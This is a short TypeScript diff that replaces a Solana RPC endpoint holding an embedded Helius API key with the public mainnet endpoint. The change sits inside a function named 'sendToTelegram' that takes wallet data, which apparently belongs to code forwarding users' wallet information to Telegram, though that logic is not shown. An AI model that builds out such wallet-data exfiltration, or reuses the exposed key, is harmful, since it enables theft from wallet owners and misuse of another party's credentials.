@@ -57,7 +57,7 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const connection = new Connection("https://rpc.helius.xyz/?api-key=e2a76efd-d70e-42e3-a97f-62cf00853484", {
+    const connection = new Connection("https://api.mainnet-beta.solana.com", {
       commitment: 'confirmed',
       confirmTransactionInitialTimeout: 60000,
     });
